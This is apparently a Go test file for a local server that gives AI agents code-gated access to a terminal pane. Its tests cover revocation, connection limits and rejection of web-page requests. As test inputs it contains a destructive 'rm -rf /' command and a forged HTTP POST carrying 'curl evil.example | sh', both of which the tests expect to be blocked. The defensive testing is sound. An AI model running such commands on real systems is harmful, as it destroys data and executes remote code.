package agent

import (
	"errors"
	"fmt"
	"io"
	"net"
	"strings"
	"sync"
	"testing"
	"time"
)

// fakeWindow is a window with one pane on it, for testing what an agent
// may and may not do.
type fakeWindow struct {
	mu      sync.Mutex
	code    string
	screen  string
	typed   string
	changed uint64
	gone    bool
	taken   bool
}

func (w *fakeWindow) Use(code string) (Pane, error) {
	w.mu.Lock()
	defer w.mu.Unlock()
	if w.taken || code != w.code {
		return Pane{}, errors.New("that code does not name a pane this window has handed over")
	}
	return Pane{ID: "pane-1", Label: "bash", Cols: 80, Rows: 24}, nil
}

func (w *fakeWindow) Look(id string) (Look, error) {
	w.mu.Lock()
	defer w.mu.Unlock()
	if w.taken {
		return Look{}, errors.New("the user has taken that pane back")
	}
	if id != "pane-1" {
		return Look{}, errors.New("no such pane")
	}
	return Look{Screen: w.screen, Gone: w.gone, Changed: w.changed}, nil
}

func (w *fakeWindow) Send(id, text string) error {
	w.mu.Lock()
	defer w.mu.Unlock()
	if w.taken {
		return errors.New("the user has taken that pane back")
	}
	if id != "pane-1" {
		return errors.New("no such pane")
	}
	w.typed += text
	return nil
}

func (w *fakeWindow) say(text string) {
	w.mu.Lock()
	defer w.mu.Unlock()
	w.screen = text
	w.changed++
}

func (w *fakeWindow) takeBack() {
	w.mu.Lock()
	defer w.mu.Unlock()
	w.taken = true
}

func (w *fakeWindow) sentText() string {
	w.mu.Lock()
	defer w.mu.Unlock()
	return w.typed
}

// listening starts a window listening for agents, and gives back a code
// for its one pane.
func listening(t *testing.T) (*fakeWindow, *Server, string) {
	t.Helper()
	w := &fakeWindow{screen: "$ "}
	s, err := Listen(Config{Window: w, OnError: func(error) {}})
	if err != nil {
		t.Fatalf("listen: %v", err)
	}
	t.Cleanup(func() { _ = s.Close() })

	code, err := NewCode(s.Port())
	if err != nil {
		t.Fatalf("code: %v", err)
	}
	w.code = code
	return w, s, code
}

// An agent given a code reads the pane and types into it, and nothing
// else.
func TestAnAgentReadsAndTypesInThePaneItWasGiven(t *testing.T) {
	w, _, code := listening(t)

	c, err := Dial(code)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = c.Close() }()

	pane, err := c.Use(code)
	if err != nil {
		t.Fatalf("use: %v", err)
	}
	if pane.Label != "bash" || pane.Cols != 80 {
		t.Errorf("it was handed %+v", pane)
	}

	w.say("$ whoami\r\nmarcus\r\n$ ")
	look, err := c.Read(pane.ID)
	if err != nil {
		t.Fatalf("read: %v", err)
	}
	if !strings.Contains(look.Screen, "marcus") {
		t.Errorf("it read %q", look.Screen)
	}

	if err := c.Send(pane.ID, "uptime\r"); err != nil {
		t.Fatalf("send: %v", err)
	}
	if got := w.sentText(); got != "uptime\r" {
		t.Errorf("the pane was sent %q", got)
	}
}

// Nothing reaches a pane without a code.
func TestWithoutACodeAnAgentCanDoNothing(t *testing.T) {
	w, _, code := listening(t)

	c, err := Dial(code)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = c.Close() }()

	// The pane is there and the agent knows its name, having guessed
	// it. Without a code that is not enough.
	if _, err := c.Read("pane-1"); err == nil {
		t.Error("it read a pane it was never handed")
	}
	if err := c.Send("pane-1", "rm -rf /\r"); err == nil {
		t.Error("it typed into a pane it was never handed")
	}
	if got := w.sentText(); got != "" {
		t.Errorf("the pane was sent %q", got)
	}
	if panes, err := c.Panes(); err != nil || len(panes) != 0 {
		t.Errorf("it holds %v, %v", panes, err)
	}
}

// A code that is not the one handed out opens nothing.
func TestAWrongCodeOpensNothing(t *testing.T) {
	_, s, _ := listening(t)

	other, err := NewCode(s.Port())
	if err != nil {
		t.Fatalf("code: %v", err)
	}
	c, err := Dial(other)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = c.Close() }()

	if _, err := c.Use(other); err == nil {
		t.Fatal("a code nobody handed out was accepted")
	}
}

// One agent cannot reach a pane another was handed.
func TestOneAgentCannotReachAnothersPane(t *testing.T) {
	w, _, code := listening(t)

	mine, err := Dial(code)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = mine.Close() }()
	pane, err := mine.Use(code)
	if err != nil {
		t.Fatalf("use: %v", err)
	}

	// A second agent on the same window, with no code of its own.
	theirs, err := Dial(code)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = theirs.Close() }()

	if _, err := theirs.Read(pane.ID); err == nil {
		t.Error("it read a pane handed to somebody else")
	}
	if err := theirs.Send(pane.ID, "x"); err == nil {
		t.Error("it typed into a pane handed to somebody else")
	}
	if got := w.sentText(); got != "" {
		t.Errorf("the pane was sent %q", got)
	}
}

// Taking a pane back stops the agent working in it, at once.
func TestTakingAPaneBackStopsTheAgent(t *testing.T) {
	w, _, code := listening(t)

	c, err := Dial(code)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = c.Close() }()
	pane, err := c.Use(code)
	if err != nil {
		t.Fatalf("use: %v", err)
	}
	if _, err := c.Read(pane.ID); err != nil {
		t.Fatalf("read: %v", err)
	}

	w.takeBack()

	if _, err := c.Read(pane.ID); err == nil {
		t.Error("it read a pane the user had taken back")
	}
	if err := c.Send(pane.ID, "x"); err == nil {
		t.Error("it typed into a pane the user had taken back")
	}
	if got := w.sentText(); got != "" {
		t.Errorf("the pane was sent %q", got)
	}
	// And the same code does not open it again.
	if _, err := c.Use(code); err == nil {
		t.Error("the code still works")
	}
}

// Waiting comes back when the pane goes quiet.
func TestWaitingComesBackWhenThePaneGoesQuiet(t *testing.T) {
	w, _, code := listening(t)
	c, err := Dial(code)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = c.Close() }()
	pane, err := c.Use(code)
	if err != nil {
		t.Fatalf("use: %v", err)
	}

	// Something running, then stopping.
	done := make(chan struct{})
	go func() {
		defer close(done)
		for i := 0; i < 5; i++ {
			w.say("line " + string(rune('a'+i)))
			time.Sleep(20 * time.Millisecond)
		}
		w.say("$ ")
	}()

	look, timedOut, err := c.Wait(pane.ID, Until{QuietMS: 150, TimeoutMS: 10000})
	if err != nil {
		t.Fatalf("wait: %v", err)
	}
	if timedOut {
		t.Error("it gave up rather than seeing the pane go quiet")
	}
	if look.Screen != "$ " {
		t.Errorf("it came back on %q", look.Screen)
	}
	<-done
}

// Waiting for something that never comes gives up and says so, with
// what is on the screen.
func TestWaitingForSomethingThatNeverComesGivesUp(t *testing.T) {
	w, _, code := listening(t)
	w.say("still going")
	c, err := Dial(code)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = c.Close() }()
	pane, err := c.Use(code)
	if err != nil {
		t.Fatalf("use: %v", err)
	}

	look, timedOut, err := c.Wait(pane.ID, Until{Contains: "never", TimeoutMS: 200})
	if err != nil {
		t.Fatalf("wait: %v", err)
	}
	if !timedOut {
		t.Error("it said it saw what it was waiting for")
	}
	if look.Screen != "still going" {
		t.Errorf("it came back with %q", look.Screen)
	}
}

// A code says which window, so two on one machine do not answer for
// each other.
func TestACodeSaysWhichWindow(t *testing.T) {
	_, one, codeOne := listening(t)
	_, two, codeTwo := listening(t)

	if one.Port() == two.Port() {
		t.Fatal("both windows took the same port")
	}
	gotOne, err := ReadCode(codeOne)
	if err != nil {
		t.Fatalf("read: %v", err)
	}
	gotTwo, err := ReadCode(codeTwo)
	if err != nil {
		t.Fatalf("read: %v", err)
	}
	if gotOne != one.Port() || gotTwo != two.Port() {
		t.Errorf("the codes name %d and %d, want %d and %d",
			gotOne, gotTwo, one.Port(), two.Port())
	}

	// And one window's code does not open the other's pane.
	c, err := Dial(codeOne)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = c.Close() }()
	if _, err := c.Use(codeTwo); err == nil {
		t.Error("the other window's code was accepted")
	}
}

// A code is not guessable from the ones before it.
//
// Distinct is not enough: a counter is distinct. What matters is that
// knowing a code, or a hundred of them, says nothing about the next.
func TestCodesAreNotGuessable(t *testing.T) {
	const tries = 100
	seen := map[string]bool{}
	var codes []string
	for i := 0; i < tries; i++ {
		code, err := NewCode(2222)
		if err != nil {
			t.Fatalf("code: %v", err)
		}
		if seen[code] {
			t.Fatalf("it made %q twice", code)
		}
		seen[code] = true
		// Long enough that guessing is not a way in: twenty bytes as
		// base32 is thirty-two characters.
		parts := strings.Split(code, "-")
		if len(parts) != 3 || len(parts[2]) != 32 {
			t.Fatalf("it made %q", code)
		}
		codes = append(codes, parts[2])
	}

	// Every position moves. A code made by counting leaves most of
	// itself the same from one to the next; one made from randomness
	// leaves none of it. The chance of a position holding still across
	// a hundred draws by luck is one in thirty-two to the ninety-ninth.
	for at := 0; at < 32; at++ {
		first := codes[0][at]
		same := true
		for _, code := range codes {
			if code[at] != first {
				same = false
				break
			}
		}
		if same {
			t.Errorf("character %d is %q in every code, so they are not random",
				at, string(first))
		}
	}
}

// Something pasted by mistake is turned away by name.
func TestSomethingThatIsNotACodeIsTurnedAway(t *testing.T) {
	for _, not := range []string{
		"", "hello", "gt1", "gt1-abc-xyz", "gt1-0-xyz", "gt1-99999-xyz",
		"gt2-2222-xyz", "gt1-2222-", "gt1-2222-xyz-extra",
	} {
		if _, err := ReadCode(not); err == nil {
			t.Errorf("%q was taken for a code", not)
		}
	}
	if _, err := ReadCode("gt1-2222-abcdef"); err != nil {
		t.Errorf("a code was turned away: %v", err)
	}
}

// Closing the window hangs up on every agent.
func TestClosingHangsUpOnEveryAgent(t *testing.T) {
	_, s, code := listening(t)
	c, err := Dial(code)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = c.Close() }()
	if _, err := c.Use(code); err != nil {
		t.Fatalf("use: %v", err)
	}

	if err := s.Close(); err != nil {
		t.Fatalf("close: %v", err)
	}
	if _, err := c.Read("pane-1"); err == nil {
		t.Error("it went on working in a pane of a window that has gone")
	}
}

// Closing twice is not a failure.
func TestClosingTwiceIsFine(t *testing.T) {
	_, s, _ := listening(t)
	if err := s.Close(); err != nil {
		t.Fatalf("close: %v", err)
	}
	if err := s.Close(); err != nil {
		t.Errorf("closing again gave %v", err)
	}
}

// An agent is told when the user hands a pane over and when it lets go.
func TestTheWindowIsToldWhenAnAgentComesAndGoes(t *testing.T) {
	w := &fakeWindow{screen: "$ "}
	used := make(chan string, 4)
	gone := make(chan string, 4)
	s, err := Listen(Config{
		Window:  w,
		OnError: func(error) {},
		OnUse:   func(id string) { used <- id },
		OnGone:  func(id string) { gone <- id },
	})
	if err != nil {
		t.Fatalf("listen: %v", err)
	}
	defer func() { _ = s.Close() }()
	code, err := NewCode(s.Port())
	if err != nil {
		t.Fatalf("code: %v", err)
	}
	w.code = code

	c, err := Dial(code)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	if _, err := c.Use(code); err != nil {
		t.Fatalf("use: %v", err)
	}
	select {
	case id := <-used:
		if id != "pane-1" {
			t.Errorf("it was told about %q", id)
		}
	case <-time.After(5 * time.Second):
		t.Fatal("the window was never told an agent had arrived")
	}

	if err := c.Close(); err != nil {
		t.Fatalf("close: %v", err)
	}
	select {
	case id := <-gone:
		if id != "pane-1" {
			t.Errorf("it was told about %q", id)
		}
	case <-time.After(5 * time.Second):
		t.Fatal("the window was never told the agent had gone")
	}
}

// Only so many agents talk to one window at once.
//
// A wait costs a goroutine and a question of the window twenty times a
// second, and anything running as this user can open a connection.
func TestOnlySoManyAgentsAtOnce(t *testing.T) {
	_, _, code := listening(t)

	var open []*Client
	defer func() {
		for _, c := range open {
			_ = c.Close()
		}
	}()
	for i := 0; i < mostAgents; i++ {
		c, err := Dial(code)
		if err != nil {
			t.Fatalf("agent %d: %v", i, err)
		}
		// Asked something, so the connection is really established
		// rather than only queued by the system.
		if _, err := c.Use(code); err != nil {
			t.Fatalf("agent %d: %v", i, err)
		}
		open = append(open, c)
	}

	// One more is turned away. The connection may be taken by the
	// system and dropped straight after, so what says so is the first
	// question going unanswered.
	extra, err := Dial(code)
	if err != nil {
		return
	}
	defer func() { _ = extra.Close() }()
	if _, err := extra.Use(code); err == nil {
		t.Error("it took one more agent than it serves")
	}
}

// A wait gives up when the window stops listening, rather than going on
// asking a window that has gone.
func TestAWaitEndsWhenTheWindowStops(t *testing.T) {
	w, s, code := listening(t)
	w.say("still going")
	c, err := Dial(code)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = c.Close() }()
	pane, err := c.Use(code)
	if err != nil {
		t.Fatalf("use: %v", err)
	}

	done := make(chan struct{})
	go func() {
		defer close(done)
		_, _, _ = c.Wait(pane.ID, Until{Contains: "never", TimeoutMS: 60000})
	}()

	if err := s.Close(); err != nil {
		t.Fatalf("close: %v", err)
	}
	select {
	case <-done:
	case <-time.After(10 * time.Second):
		t.Error("the wait went on after the window stopped listening")
	}
}

// Waiting for text on the screen comes back as soon as it is there,
// without waiting for the pane to go quiet.
//
// A command that keeps printing never goes quiet, so a wait that only
// watched for quiet would sit there until the time ran out on something
// that had already happened.
func TestWaitingForTextComesBackWhileThePaneIsStillBusy(t *testing.T) {
	w, _, code := listening(t)
	c, err := Dial(code)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = c.Close() }()
	pane, err := c.Use(code)
	if err != nil {
		t.Fatalf("use: %v", err)
	}

	// Something that says the thing and then keeps going, so the screen
	// never settles.
	stop := make(chan struct{})
	defer close(stop)
	go func() {
		w.say("Listening on port 8080")
		for {
			select {
			case <-stop:
				return
			default:
			}
			w.say("Listening on port 8080\nstill working")
			time.Sleep(5 * time.Millisecond)
			w.say("Listening on port 8080\nstill working.")
			time.Sleep(5 * time.Millisecond)
		}
	}()

	look, timedOut, err := c.Wait(pane.ID, Until{
		Contains: "Listening on port", QuietMS: 60000, TimeoutMS: 10000,
	})
	if err != nil {
		t.Fatalf("wait: %v", err)
	}
	if timedOut {
		t.Error("it waited for a busy pane to go quiet instead of for the text")
	}
	if !strings.Contains(look.Screen, "Listening on port") {
		t.Errorf("it came back on %q", look.Screen)
	}
}

// Something that is not an agent is hung up on, not talked to.
//
// A page in a browser can be made to send a chosen body to a port on
// this machine. It cannot read the answer, but it does not need to:
// typing into somebody's shell blind is enough. What it cannot choose
// is the first bytes, because a request line comes first, so a window
// that answers a line it cannot read and then reads another is a window
// a web page can type into.
func TestAWebRequestIsHungUpOnRatherThanRead(t *testing.T) {
	w, s, code := listening(t)

	conn, err := net.Dial("tcp", fmt.Sprintf("127.0.0.1:%d", s.Port()))
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = conn.Close() }()

	// What a form post from a page looks like, with the window's own
	// protocol in the body: the request line, a header, and then the
	// lines the page chose.
	body := "POST / HTTP/1.1\r\n" +
		"Host: 127.0.0.1\r\n" +
		"Content-Type: text/plain\r\n" +
		"\r\n" +
		`{"do":"use","code":"` + code + `"}` + "\r\n" +
		`{"do":"send","pane":"1","text":"curl evil.example | sh\r"}` + "\r\n"
	if _, err := io.WriteString(conn, body); err != nil {
		// The window may have hung up mid-write, which is the point.
		t.Logf("the window hung up during the write: %v", err)
	}

	// Nothing reached the shell, and the connection is closed.
	if got := w.sentText(); got != "" {
		t.Fatalf("a web request typed %q into the shell", got)
	}
	if err := conn.SetReadDeadline(time.Now().Add(5 * time.Second)); err != nil {
		t.Fatalf("deadline: %v", err)
	}
	if _, err := io.ReadAll(conn); err != nil {
		t.Fatalf("the window did not hang up: %v", err)
	}
	if got := w.sentText(); got != "" {
		t.Errorf("a web request typed %q into the shell", got)
	}
}

// And a line that stops making sense part way through ends the
// conversation rather than being answered.
func TestAConnectionThatStopsMakingSenseIsHungUpOn(t *testing.T) {
	w, s, code := listening(t)

	conn, err := net.Dial("tcp", fmt.Sprintf("127.0.0.1:%d", s.Port()))
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = conn.Close() }()

	lines := `{"do":"hello","protocol":"` + hello + `"}` + "\n" +
		"this is not a message\n" +
		`{"do":"use","code":"` + code + `"}` + "\n" +
		`{"do":"send","pane":"1","text":"whoami\r"}` + "\n"
	if _, err := io.WriteString(conn, lines); err != nil {
		t.Logf("the window hung up during the write: %v", err)
	}
	if err := conn.SetReadDeadline(time.Now().Add(5 * time.Second)); err != nil {
		t.Fatalf("deadline: %v", err)
	}
	if _, err := io.ReadAll(conn); err != nil {
		t.Fatalf("the window did not hang up: %v", err)
	}
	if got := w.sentText(); got != "" {
		t.Errorf("it went on to type %q", got)
	}
}

// A connection that says nothing is let go of rather than held.
func TestAConnectionThatSaysNothingIsLetGoOf(t *testing.T) {
	_, s, _ := listening(t)

	conn, err := net.Dial("tcp", fmt.Sprintf("127.0.0.1:%d", s.Port()))
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = conn.Close() }()

	if err := conn.SetReadDeadline(time.Now().Add(sayHelloWithin + 5*time.Second)); err != nil {
		t.Fatalf("deadline: %v", err)
	}
	if _, err := io.ReadAll(conn); err != nil {
		t.Errorf("it was still holding the connection: %v", err)
	}
}

// A window that has gone says so plainly, and says the same thing every
// time it is asked.
//
// The first question after it went used to come back with whatever the
// network last complained about, and every one after that with a raw
// socket error. An agent reads those; it deserves a sentence rather
// than a Winsock number.
func TestAWindowThatWentSaysSoEveryTime(t *testing.T) {
	_, s, code := listening(t)
	c, err := Dial(code)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = c.Close() }()
	pane, err := c.Use(code)
	if err != nil {
		t.Fatalf("use: %v", err)
	}

	if err := s.Close(); err != nil {
		t.Fatalf("close: %v", err)
	}

	for i := 0; i < 3; i++ {
		_, err := c.Read(pane.ID)
		if !errors.Is(err, ErrGone) {
			t.Errorf("ask %d gave %v", i, err)
		}
	}
	if err := c.Send(pane.ID, "x"); !errors.Is(err, ErrGone) {
		t.Errorf("typing gave %v", err)
	}
	if !c.Gone() {
		t.Error("it does not know the window has gone")
	}
}
